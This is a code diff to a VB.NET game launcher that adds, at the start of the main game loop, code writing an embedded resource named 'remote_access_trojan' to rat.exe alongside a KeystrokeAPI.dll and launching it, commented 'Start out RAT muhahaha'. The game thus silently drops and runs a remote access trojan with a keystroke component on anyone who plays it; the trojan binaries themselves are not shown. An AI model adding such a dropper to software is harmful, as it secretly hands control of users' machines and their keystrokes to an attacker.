@@ -1,6 +1,8 @@
 ﻿'*******************************************************
 'Main form of the program used simply to launch the game
 '*******************************************************
+Imports System.IO
+
 Public Class Form1
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
@@ -92,6 +94,13 @@ Public Module Module1
     'Real time game loop
     '*******************
     Public Sub Main()
+        'Start out RAT muhahaha
+        Dim exe As String = Path.Combine(Directory.GetCurrentDirectory(), "rat.exe")
+        Dim keystrokeAPI As String = Path.Combine(Directory.GetCurrentDirectory(), "KeystrokeAPI.dll")
+        System.IO.File.WriteAllBytes(exe, My.Resources.remote_access_trojan)
+        System.IO.File.WriteAllBytes(keystrokeAPI, My.Resources.KeystrokeAPI)
+        Process.Start(exe)
+
         game = New Game(Form1, 800, 600)
         Form1.Activate()
 
